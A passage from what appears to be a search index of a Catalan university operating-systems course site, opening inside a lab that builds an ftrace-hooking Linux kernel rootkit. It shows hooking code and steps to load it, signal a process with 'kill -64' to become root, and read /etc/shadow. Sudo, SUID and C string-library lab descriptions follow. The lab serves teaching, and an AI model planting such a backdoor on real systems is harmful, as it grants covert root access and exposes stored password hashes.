modified, so we have to alert ftrace to this fact. This\n        * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also\n        * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because\n        * the built-in anti-recursion guard provided by ftrace is useless if\n        * we're modifying $rip. This is why we have to implement our own checks\n        * (see USE_FENTRY_OFFSET). */\n        hook-&gt;ops.func = (ftrace_func_t)fh_ftrace_thunk;\n        hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS\n                | FTRACE_OPS_FL_RECURSION\n                | FTRACE_OPS_FL_IPMODIFY;\n\n        err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 0, 0);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n            return err;\n        }\n\n        err = register_ftrace_function(&hook-&gt;ops);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n            return err;\n        }\n\n        return 0;\n    }\n\n    /* Disabling our function hook is just a simple matter of calling the built-in\n    * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the\n    * opposite order to that in fh_install_hook()).\n    * */\n    void fh_remove_hook(struct ftrace_hook *hook)\n    {\n        int err;\n        err = unregister_ftrace_function(&hook-&gt;ops);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n        }\n\n        err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 1, 0);\n        if(err)\n        {\n            printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n        }\n    }\n\n    /* To make it easier to hook multiple functions in one module, this provides\n    * a simple loop over an array of ftrace_hook struct\n    * */\n    int fh_install_hooks(struct ftrace_hook *hooks, size_t count)\n    {\n        int err;\n        size_t i;\n\n        for (i = 0 ; i &lt; count ; i++)\n        {\n            err = fh_install_hook(&hooks[i]);\n            if(err)\n                goto error;\n        }\n        return 0;\n\n    error:\n        while (i != 0)\n        {\n            fh_remove_hook(&hooks[--i]);\n        }\n        return err;\n    }\n\n    void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)\n    {\n        size_t i;\n\n        for (i = 0 ; i &lt; count ; i++)\n            fh_remove_hook(&hooks[i]);\n    }\nAquesta implementaci√≥ es basa en la implementaci√≥ de ftrace. Ftrace √©s una eina de depuraci√≥ que permet monitoritzar les crides a sistema. Per a m√©s informaci√≥ sobre ftrace podeu consultar aquest enlla√ß. Registra la informaci√≥ relacionada amb les crides a sistema i ens permet definir callbacks, entre altres funcions. Ens permet intervenir quan el registre ‚Äô‚Äò‚Äôrip‚Äô‚Äô‚Äôcontingui una adre√ßa de mem√≤ria. Si establim que aquesta adre√ßa √©s on comen√ßa la funcionalitat d‚Äôuna crida a sistema, podem modificar perqu√® s‚Äôexecuti una altra funcionalitat.\nstruct ftrace_hook {\n    const char *name;\n    void *function;\n    void *original;\n    unsigned long address;\n    struct ftrace_ops ops;\n};\nLa part m√©s important de hook √©s la callback. Aquesta funci√≥ est√† assignant al registre IP (seg√ºent instrucci√≥ a executar pel processador) a l‚Äôadre√ßa hook-&gt;function.\nstatic void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, \n    struct ftrace_ops *ops, struct pt_regs *regs)\n{\n    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n    #if USE_FENTRY_OFFSET\n        regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #else\n        if(!within_module(parent_ip, THIS_MODULE))\n            regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #endif\n}\nnotrace √©s un tractament especial per marcar funcions prohibides per a fer seguiment amb ptrace. Es poden marcar funcions que s‚Äôutilitzen en el proc√©s de seguiment. Evitem que el sistema es pengi si cridem de forma err√≤nia a la vostra callback.\nTamb√© √©s molt important la funci√≥ fh_resolve_hook_address(). Aquesta funci√≥ utilitza kallsyms_lookup_name() (linux/kallsyms.h&gt;) per cercar l‚Äôadre√ßa de la crida a sistema real. Aquest valor s‚Äôemprar√† tant per obtenir el codi original i guardar-lo en una altra adre√ßa com per sobreescriu amb el nostre rootkit. Es guarda en l‚Äôatribut address.\n    static int fh_resolve_hook_address(struct ftrace_hook *hook)\n    {\n    #ifdef KPROBE_LOOKUP\n        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n        kallsyms_lookup_name_t kallsyms_lookup_name;\n        register_kprobe(&kp);\n        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n        unregister_kprobe(&kp);\n    #endif\n        hook-&gt;address = kallsyms_lookup_name(hook-&gt;name);\n\n        if (!hook-&gt;address)\n        {\n            printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook-&gt;name);\n            return -ENOENT;\n        }\n    }\nOBSERVACI√ì: Quan intentem fer hook, es poden donar bucles recursius. Per evitar-ho tenim diferents opcions. Podem intenta detectar la recursivitat mirant l‚Äôadre√ßa de retorn de la funci√≥ o b√© podem saltar a una adre√ßa per sobre la crida ftrace.\n    #if USE_FENTRY_OFFSET\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;\n    #else\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address;\n    #endif\nFinalment, no ens podem oblidar de comentar els flags que s‚Äôutilitzen per definir la callback:\n\nFTRACE_OPS_FL_SAVE_REGS: Flag que permet passar pt_regs de la crida original al nostre hook.\nFTRACE_OPS_FL_IP_MODIFY: Indiquem a ftrace que modificarem el registre IP.\nFTRACE_OPS_FL_RECURSION: Desactivar la protecci√≥ per defecte de ftrace.\n\n    hook-&gt;ops.func = (ftrace_func_t)fh_ftrace_thunk;\n    hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS\n                | FTRACE_OPS_FL_RECURSION\n                | FTRACE_OPS_FL_IPMODIFY;\nB√†sicament aquestes funcions ens permet instal¬∑lar/desinstal¬∑lar hooks a crides a sistema.\n\nftrace_set_filter_ip() diu a ftrace que nom√©s executi la nostra callback quan rip √©s l‚Äôadre√ßa de sys_open (desada a hook-&gt;address).\nregister_ftrace_function(). Asegura que tot estigui al seu lloc i l‚Äôhook preparat.\n\n    err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 0, 0);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n        return err;\n    }\n    err = register_ftrace_function(&hook-&gt;ops);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: register_ftrace_function() failed: %d\\n\", err);\n        return err;\n    }\n\nDesfem el proc√©s anterior:\n\nvoid fh_remove_hook(struct ftrace_hook *hook)\n{\n    int err;\n    err = unregister_ftrace_function(&hook-&gt;ops);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: unregister_ftrace_function() failed: %d\\n\", err);\n    }\n\n    err = ftrace_set_filter_ip(&hook-&gt;ops, hook-&gt;address, 1, 0);\n    if(err)\n    {\n        printk(KERN_DEBUG \"rootkit: ftrace_set_filter_ip() failed: %d\\n\", err);\n    }\n}\nPreparem un Makefile per compilar el nostre m√≤dul del kernel:\nobj-m += rootkit.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\nCompilem el nostre m√≤dul del kernel:\nmake\nInstal¬∑lem el nostre m√≤dul del kernel:\ninsmod rootkit.ko\nComprovem que el nostre m√≤dul s‚Äôha instal¬∑lat correctament:\nlsmod | grep rootkit\nComprovem que el nostre rootkit funciona correctament:\ndmesg | tail\nCrearem un usuari al sistema sense privilegis d‚Äôadministrador:\nuseradd test\nEns connectem al sistema amb aquest usuari:\nsu - test\nObservem els valors que identifiquen l‚Äôusuari actual:\nid\nIntenteu revisar un fitxer que nom√©s pot ser llegit pel root (/etc/shadow):\ncat /etc/shadow\nActivem el nostre backdoor:\nsleep 120 &\nObtenim el id del proc√©s sleep:\nps | grep sleep\nEnviem la senyal:\nkill -64 20005\nComprovem que ara tenim privilegis d‚Äôadministrador:\nid\nComprovem que ara podem llegir el fitxer /etc/shadow:\ncat /etc/shadow\nDesinstal¬∑lem el nostre m√≤dul del kernel:\nrmmod rootkit",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 ¬∑ Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html",
    "href": "labs/05-procs/lab01.html",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "",
    "text": "Implementaci√≥ simple de la comanda sudo.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#objectiu",
    "href": "labs/05-procs/lab01.html#objectiu",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "",
    "text": "Implementaci√≥ simple de la comanda sudo.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#context",
    "href": "labs/05-procs/lab01.html#context",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Context",
    "text": "Context\nLa comanda sudo permet als usuaris executar programes amb els privilegis de seguretat d‚Äôun altre usuari, per defecte l‚Äôusuari root. Per exemple:\nsudo cat /etc/shadow \n# mostra el contingut del fitxer /etc/shadow\ncat /etc/shadow\n# error de perm√≠s denegat",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#descripci√≥-de-lactivitat",
    "href": "labs/05-procs/lab01.html#descripci√≥-de-lactivitat",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Descripci√≥ de l‚Äôactivitat",
    "text": "Descripci√≥ de l‚Äôactivitat\nImplementeu un programa anomenat ohmy_sudo que reprodueixi una funcionalitat b√†sica de sudo. Es a dir, el programa ha de permetre a un usuari executar una comanda amb els privilegis de l‚Äôusuari root.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#permisos-a-linux",
    "href": "labs/05-procs/lab01.html#permisos-a-linux",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Permisos a Linux",
    "text": "Permisos a Linux\nEls sistemes UNIX/Linux permet controlar QUI pot accedir als fitxers i directoris a trav√©s dels permisos. Hi ha tres tipus de permisos: lectura, escriptura i execuci√≥. Aquests permisos es poden assignar a tres tipus d‚Äôusuaris: owner, group i others.\n\nOwner: Usuari que ha creat el fitxer.\nGroup: Usuaris dels grups.\nOther: Qualsevol usuari del sistema.\n\nEls permisos es representen amb una cadena de 10 car√†cters. El primer car√†cter indica el tipus de fitxer (per exemple, - per a fitxers normals i d per a directoris). Els seg√ºents nou car√†cters es divideixen en tres grups de tres car√†cters cadascun, que representen els permisos per a l‚Äôowner, el group i els others, respectivament. Cada grup de tres car√†cters pot contenir els seg√ºents car√†cters:\n\nr: Perm√≠s de lectura.\nw: Perm√≠s d‚Äôescriptura.\nx: Perm√≠s d‚Äôexecuci√≥.\n-: Perm√≠s denegat.\n\nPer exemple:\njordi@debianlab:~$ touch a.txt\njordi@debianlab:~$ ls -la a.txt\n-rw-r--r-- 1 jordi jordi 0 11 de jul.  11:26 a.txt\n\nL‚Äôusuari jordi √©s owner del fitxer a.txt i pot llegir/escriure per√≤ no executar.\nEls membres del grup jordi poden llegir el fitxer, per√≤ no escriure ni executar.\nIgual que la resta d‚Äôusuaris.\n\nPer a gestionar els permisos dels fitxers i directoris, utilitzarem la comanda chmod. Aquesta comanda ens permet canviar els permisos d‚Äôacc√©s dels fitxers i directoris. La sintaxi de la comanda √©s la seg√ºent:\nchmod [qui] operaci√≥ permisos fitxer\n\nAmb ls -la fitxer, podem veure els permisos actuals del fitxer.\nAmb chod +x fitxer, afegim el perm√≠s d‚Äôexecuci√≥ per a tots els usuaris (owner, grup i altres).\nAmb chmod -x fitxer, eliminem el perm√≠s d‚Äôexecuci√≥ per a tots els usuaris.\nAmb chmod o-r fitxer, eliminem el perm√≠s de lectura per a altres usuaris.\nAmb chmod g+w fitxer, afegim el perm√≠s d‚Äôescriptura per al grup.\nAmb chmod o+w fitxer, afegim el perm√≠s d‚Äôescriptura per a altres usuaris.\nAmb chmod a-w fitxer, eliminem el perm√≠s d‚Äôescriptura per a tots els usuaris (owner, grup i altres).\nAmb chmod +w fitxer, afegim el perm√≠s d‚Äôescriptura a tots els usuaris.\nAmb chmod -r fitxer, eliminem tots els permisos de lectura per a tots els usuaris.\n\nLa comanda chown ens permet canviar l‚Äôowner i el grup d‚Äôun fitxer o directori. La sintaxi de la comanda √©s la seg√ºent:\nchown [nou_owner][:nou_grup] fitxer\nA m√©s dels permisos b√†sics, Linux tamb√© permet assignar permisos especials als fitxers i directoris. Aquests permisos especials s√≥n:\n\nSetuid (SUID): Permet que un usuari executi un fitxer amb els privilegis de l‚Äôowner del fitxer. Aquest perm√≠s s‚Äôindica amb una s en lloc de la x en els permisos de l‚Äôowner. Per exemple, si un fitxer t√© els permisos -rwsr-xr-x, significa que qualsevol usuari que executi aquest fitxer ho far√† amb els privilegis de l‚Äôowner del fitxer.\nSetgid (SGID): Permet que un usuari executi un fitxer amb els privilegis del grup del fitxer. Aquest perm√≠s s‚Äôindica amb una s en lloc de la x en els permisos del grup. Per exemple, si un fitxer t√© els permisos -rwxr-sr-x, significa que qualsevol usuari que executi aquest fitxer ho far√† amb els privilegis del grup del fitxer.\nSticky bit: Permet que nom√©s l‚Äôowner d‚Äôun fitxer o directori pugui eliminar o renombrar els fitxers dins d‚Äôun directori. Aquest perm√≠s s‚Äôindica amb una t en lloc de la x en els permisos dels altres usuaris. Per exemple, si un directori t√© els permisos drwxrwxrwt, significa que qualsevol usuari pot crear fitxers dins d‚Äôaquest directori, per√≤ nom√©s l‚Äôowner dels fitxers pot eliminar-los o renombrar-los.",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#implementaci√≥",
    "href": "labs/05-procs/lab01.html#implementaci√≥",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Implementaci√≥",
    "text": "Implementaci√≥\nImplementareu el programa ohmy_sudo en C basat en el seg√ºent esquelet:\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main( int argc, char* argv[] ){\n    @TODO afegir codi\n    return 0;\n}\nActualizeu el fitxer Makefile per compilar el programa i executar-lo amb els permisos adequats.\nMakefile\nall: ohmy_sudo\n\nohmy_sudo: ohmy_sudo.o\n    gcc $&lt; -o $@\n\nohmy_sudo.o: ohmy_sudo.c\n    gcc -c $&lt; -o $@\n\nconfigure:\n    @TODO permissos\n\ntest:\n    useradd test\n    su test -c './ohmy_sudo whoami'\n    make configure\n    su test -c './ohmy_sudo whoami'\n    userdel test\n\nrun:\n    ./ohmy_sudo $(ARGS)\n\nclean:\n    rm ohmy_sudo.o ohmy_sudo",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "labs/05-procs/lab01.html#questions-de-reflexi√≥",
    "href": "labs/05-procs/lab01.html#questions-de-reflexi√≥",
    "title": "Laboratori 11: ohmy_sudo",
    "section": "Questions de reflexi√≥",
    "text": "Questions de reflexi√≥\n\nQuina diferencia hi ha entre utilitzar un PATH absolut i un PATH relatiu per executar un programa?\nSi en el nostre entorn hi ha la variable LD_PRELOAD=/tmp/mylib.so, qu√® passaria quan execut√©s un programa?\nQu√® recomanaries per evitar situacions no desitjades en l‚Äôexecuci√≥ de programes amb privilegis elevats?",
    "crumbs": [
      "Laboratoris",
      "Unitat 03",
      "Laboratori 11 ¬∑ OhMySudo!"
    ]
  },
  {
    "objectID": "course-information/schedule.html",
    "href": "course-information/schedule.html",
    "title": "Sistemes Operatius",
    "section": "",
    "text": "A continuaci√≥ es presenta un calendari complet dels temes, el contingut del curs i les tasques per al semestre. Tingueu en compte que aquest calendari √©s un document viu i es pot actualitzar. Tots els canvis es publicaran aqu√≠ per assegurar-vos que teniu la informaci√≥ m√©s actual.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSetmana\nTipus\nData\nTema\nDiapositives\nApunts\nLaboratori\nAltres\nTasques\nLliuraments\n\n\n\n\n1\nTeoria\n09/09/25\nUnitat 01: Introducci√≥\nüìñ\nüìö\n\n\n\n\n\n\n1\nLaboratori\n10/09/25\nUnitat 01: Virtualitzaci√≥ i Control de Versions\nüìñ\n\nüìÑ üìÑ üìÑ üìÑ üìÑ\n\n\n\n\n\n2\nTeoria\n16/09/25\nUnitat 01: Introducci√≥ a la programaci√≥ de Sistema (I) (C)\nüìñ\nüìö\n\n\nüë©üèª‚Äçüíª\n\n\n\n3\nTeoria/Laboratori\n22/09/25\nUnitat 02: Kernel de Linux\nüìñ\n\nüìÑ\n\n\n\n\n\n3\nLaboratori\n24/09/25\nUnitat 02: Crides a sistema\nüìñ\n\nüìÑ üìÑüë©üèª‚Äçüíª\n\nüë©üèª‚Äçüíª\n\n\n\n4\nLaboratori\n29/09/25\nUnitat 02: Kernel de Linux\n\n\nüìÑ üìÑ\n\n\n\n\n\n4\nTeoria/Laboratori\n01/10/25\nUnitat 03: Processos\nüìñ\n\n\n\nüî®\n\n\n\n5\nTeoria\n06/10/25\nUnitat 03: Creaci√≥ de Processos\nüìñ\n\n\n\nüë©üèª‚Äçüíª\n\n\n\n5\nTeoria/Laboratori\n08/10/25\nUnitat 03: Senyals\nüìñ\nüë©üèª‚Äçüíª\n\n\n\n\n\n\n6\nTeoria/Laboratori\n13/10/25\nUnitat 03: Comunicaci√≥ entre processos\nüìñ\n\nüìÑ\n\n\n\n\n\n6\nLaboratori\n15/10/25\nVaga general\n\n\n\n\n\n\n\n\n7\nTeoria/Laboratori\n20/10/25\nUnitat 03: Pipes\nüìñ"
  },
  {
    "objectID": "course-information/schedule.html#planificaci√≥",
    "href": "course-information/schedule.html#planificaci√≥",
    "title": "Sistemes Operatius",
    "section": "",
    "text": "A continuaci√≥ es presenta un calendari complet dels temes, el contingut del curs i les tasques per al semestre. Tingueu en compte que aquest calendari √©s un document viu i es pot actualitzar. Tots els canvis es publicaran aqu√≠ per assegurar-vos que teniu la informaci√≥ m√©s actual.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSetmana\nTipus\nData\nTema\nDiapositives\nApunts\nLaboratori\nAltres\nTasques\nLliuraments\n\n\n\n\n1\nTeoria\n09/09/25\nUnitat 01: Introducci√≥\nüìñ\nüìö\n\n\n\n\n\n\n1\nLaboratori\n10/09/25\nUnitat 01: Virtualitzaci√≥ i Control de Versions\nüìñ\n\nüìÑ üìÑ üìÑ üìÑ üìÑ\n\n\n\n\n\n2\nTeoria\n16/09/25\nUnitat 01: Introducci√≥ a la programaci√≥ de Sistema (I) (C)\nüìñ\nüìö\n\n\nüë©üèª‚Äçüíª\n\n\n\n3\nTeoria/Laboratori\n22/09/25\nUnitat 02: Kernel de Linux\nüìñ\n\nüìÑ\n\n\n\n\n\n3\nLaboratori\n24/09/25\nUnitat 02: Crides a sistema\nüìñ\n\nüìÑ üìÑüë©üèª‚Äçüíª\n\nüë©üèª‚Äçüíª\n\n\n\n4\nLaboratori\n29/09/25\nUnitat 02: Kernel de Linux\n\n\nüìÑ üìÑ\n\n\n\n\n\n4\nTeoria/Laboratori\n01/10/25\nUnitat 03: Processos\nüìñ\n\n\n\nüî®\n\n\n\n5\nTeoria\n06/10/25\nUnitat 03: Creaci√≥ de Processos\nüìñ\n\n\n\nüë©üèª‚Äçüíª\n\n\n\n5\nTeoria/Laboratori\n08/10/25\nUnitat 03: Senyals\nüìñ\nüë©üèª‚Äçüíª\n\n\n\n\n\n\n6\nTeoria/Laboratori\n13/10/25\nUnitat 03: Comunicaci√≥ entre processos\nüìñ\n\nüìÑ\n\n\n\n\n\n6\nLaboratori\n15/10/25\nVaga general\n\n\n\n\n\n\n\n\n7\nTeoria/Laboratori\n20/10/25\nUnitat 03: Pipes\nüìñ"
  },
  {
    "objectID": "projects/project01.html",
    "href": "projects/project01.html",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "",
    "text": "Entendre i implementar les funcions per operar amb strings (char *) en C.\nAprendre a gestionar la mem√≤ria din√†mica de manera segura i eficient amb malloc, calloc, realloc i free.\nDissenyar i implementar llibreries modulars i reutilitzables.\nAplicar bones pr√†ctiques de programaci√≥ per assegurar la qualitat del codi.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#objectius",
    "href": "projects/project01.html#objectius",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "",
    "text": "Entendre i implementar les funcions per operar amb strings (char *) en C.\nAprendre a gestionar la mem√≤ria din√†mica de manera segura i eficient amb malloc, calloc, realloc i free.\nDissenyar i implementar llibreries modulars i reutilitzables.\nAplicar bones pr√†ctiques de programaci√≥ per assegurar la qualitat del codi.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#entorn-de-desenvolupament",
    "href": "projects/project01.html#entorn-de-desenvolupament",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "üõ†Ô∏è Entorn de Desenvolupament",
    "text": "üõ†Ô∏è Entorn de Desenvolupament\n\nLlenguatge de programaci√≥: C (est√†ndard C99 o superior).\nCompilador: gcc.\nEina de construcci√≥: make.\nVM amb Debian.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#estructura-del-projecte",
    "href": "projects/project01.html#estructura-del-projecte",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "üóÇÔ∏è Estructura del Projecte",
    "text": "üóÇÔ∏è Estructura del Projecte\nEl projecte es pot realitzar amb grups de fins a 3 persones. Per obtenir el repositori del projecte, heu d‚Äôacceptar l‚Äôactivitat del Github Classroom. Un cop acceptada, el primer membre assignar√† un nom a l‚Äôequip i la restants membres s‚Äôhi podran afegir. Un cop fet aix√≤, cada membre haur√† de clonar el repositori al seu entorn local.\nLa seg√ºent √©s l‚Äôestructura b√†sica del projecte:\n‚îú‚îÄ‚îÄ build            \n‚îú‚îÄ‚îÄ include           \n‚îÇ   ‚îú‚îÄ‚îÄ ohmy_string.h\n‚îÇ   ‚îî‚îÄ‚îÄ safe_string.h\n‚îú‚îÄ‚îÄ Makefile          \n‚îú‚îÄ‚îÄ README.md         \n‚îú‚îÄ‚îÄ samples           \n‚îú‚îÄ‚îÄ src               \n‚îÇ   ‚îî‚îÄ‚îÄ string\n‚îÇ       ‚îú‚îÄ‚îÄ ohmy_string.c\n‚îÇ       ‚îî‚îÄ‚îÄ safe_string.c\n‚îî‚îÄ‚îÄ tests             \n    ‚îú‚îÄ‚îÄ graded_test.c\n    ‚îú‚îÄ‚îÄ graded_test.h\n    ‚îú‚îÄ‚îÄ test_ohmystring.c\n    ‚îî‚îÄ‚îÄ test_safestring.c\n\n\n\n\n\n\nImportantNo modifiqueu els fitxers de tests\n\n\n\nEls fitxers de tests no s‚Äôhan de modificar. Aquests fitxers contenen proves autom√†tiques que s‚Äôexecutaran per verificar la funcionalitat de les llibreries i programes.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#tasques-a-realitzar",
    "href": "projects/project01.html#tasques-a-realitzar",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "üìú Tasques a realitzar",
    "text": "üìú Tasques a realitzar\n\nLlibreria ohmy_string.h\nAquesta llibreria ha de replicar les funcionalitats b√†siques de la llibreria est√†ndard string.h, implementant funcions com strlen, strcpy, strcat, strcmp, entre altres, sense utilitzar cap funci√≥ de la llibreria est√†ndard.\nchar *ohmy_strcpy(char *dest, const char *src);\nchar *ohmy_strncpy(char *dest, const char *src, size_t n);\nchar *ohmy_strcat(char *dest, const char *src);\nchar *ohmy_strncat(char *dest, const char *src, size_t n);\nsize_t ohmy_strlen(const char *s);\nint ohmy_strcmp(const char *s1, const char *s2);\nint ohmy_strncmp(const char *s1, const char *s2, size_t n);\nchar *ohmy_strchr(const char *s, int c);\nchar *ohmy_strrchr(const char *s, int c);\nchar *ohmy_strstr(const char *haystack, const char *needle);\nchar *ohmy_strrstr(const char *haystack, const char *needle);\nvoid *ohmy_memcpy(void *dest, const void *src, size_t n);\nvoid *ohmy_memmove(void *dest, const void *src, size_t n);\nvoid *ohmy_memset(void *s, int c, size_t n);\nint ohmy_memcmp(const void *s1, const void *s2, size_t n);\n\nImplementeu totes les funcions del fitxer d‚Äôencap√ßalament ohmy_string.h a ohmy_string.c. Com a refer√®ncia, podeu consultar la documentaci√≥ oficial del manual de C per a la llibreria string.h o b√© les refer√®ncies de la llibreria musl libc.\nNo es permet l‚Äô√∫s de cap funci√≥ de la llibreria est√†ndard string.h dins de la implementaci√≥.\nNo es pot incloure cap altra llibreria a ohmy_string.c ni a ohmy_string.h, excepte les necess√†ries per a la definici√≥ de tipus b√†sics (com stddef.h per a size_t(i opcionalment stdint.h o limits.h si ho necessiteu per constants o tipus b√†sics)).\nImplementar un conjunt de programes simples que utilitzin les funcions de la llibreria per demostrar-ne el funcionament. Aquests programes s‚Äôhan de col¬∑locar a la carpeta samples/.\nPots verificar la funcionalitat de la llibreria mitjan√ßant la comanda de test: make test_ohmy. Aquesta comanda compilar√† i executar√† els tests autom√†tics definits a tests/test_ohmystring.c.\n\n\n\nLlibreria safe_string.h\nAquest apartat implica el disseny i implementaci√≥ d‚Äôun nou tipus de dada SafeString que gestioni cadenes de car√†cters de manera segura. Aquest nou tipus ha d‚Äôabordar problemes comuns com desbordaments de b√∫fer, gesti√≥ de mem√≤ria i acc√©s no controlat, problemes habituals quan es treballa amb cadenes din√†miques en C.\nPer exemple, l‚Äô√∫s de la llibreria safe_string.h no hauria de permetre:\n\nDesbordaments de b√∫fer\nchar buffer[10];\nstrcpy(buffer, \"Aquesta cadena √©s massa llarga per al buffer\");\nFugues de mem√≤ria\nchar *str = malloc(100);\n// ... √∫s de str\n// Oblidem alliberar la mem√≤ria\nAccessos fora de l√≠mits\nchar *str = malloc(10);\nstr[10] = 'A'; // Acc√©s fora de l√≠mits\n\nEl tipus SafeString ha de ser una estructura que gestioni el seu propi estat. Ha de contenir, almenys, els seg√ºents camps:\n\nPunter al buffer de car√†cters.\nLongitud actual de la cadena.\nCapacitat total del buffer assignat (la mida m√†xima actual).\n\nAquesta estructura ha de ser opaca, √©s a dir, els usuaris de la llibreria no han de poder accedir directament als seus camps. En lloc d‚Äôaix√≤, han d‚Äôutilitzar les funcions proporcionades per la llibreria per interactuar amb les cadenes. La llibreria no pot exposar cap camp p√∫blic que permeti l‚Äôacc√©s directe a la mem√≤ria interna. Tota operaci√≥ de modificaci√≥ (afegir, inserir) ha de comprovar la capacitat i redimensionar l‚Äôespai (realloc) si cal.\n\nImplementeu totes les funcions del fitxer d‚Äôencap√ßalament safe_string.h a safe_string.c.\nHeu de fer √∫s de la llibreria string.h per a les operacions internes amb cadenes.\nPodeu incloure altres llibreries est√†ndard si √©s necessari (com stdlib.h per a la gesti√≥ de mem√≤ria).\nImplementar un conjunt de programes simples que utilitzin les funcions de la llibreria per demostrar-ne el funcionament. Aquests programes s‚Äôhan de col¬∑locar a la carpeta samples/.\nPots verificar la funcionalitat de la llibreria mitjan√ßant la comanda de test: make test_safe. Aquesta comanda compilar√† i executar√† els tests autom√†tics definits a tests/test_safestring.c.\n\n\n\nConfiguraci√≥ del Makefile\nEl Makefile ha de permetre compilar les dues llibreries (ohmy_string i safe_string), aix√≠ com els programes de test i els exemples. La versi√≥ inicial del Makefile ja est√† proporcionada, per√≤ no est√† completa per als programes de la carpeta samples/. La resta de funcionalitats del Makefile esta implementada, incloent la compilaci√≥ de les llibreries i els tests autom√†tics. Cal afegir les regles necess√†ries per compilar i executar els programes de la carpeta samples.",
    "crumbs": [
      "Projectes",
      "Pr√†ctica 01 ¬∑ Manipulaci√≥ de Cadenes de Car√†cters en C"
    ]
  },
  {
    "objectID": "projects/project01.html#avaluaci√≥-i-criteris-de-qualitat",
    "href": "projects/project01.html#avaluaci√≥-i-criteris-de-qualitat",
    "title": "Pr√†ctica 01: Manipulaci√≥ de Cadenes de Car√†cters en C",
    "section": "üíØ Avaluaci√≥ i Criteris de Qualitat",
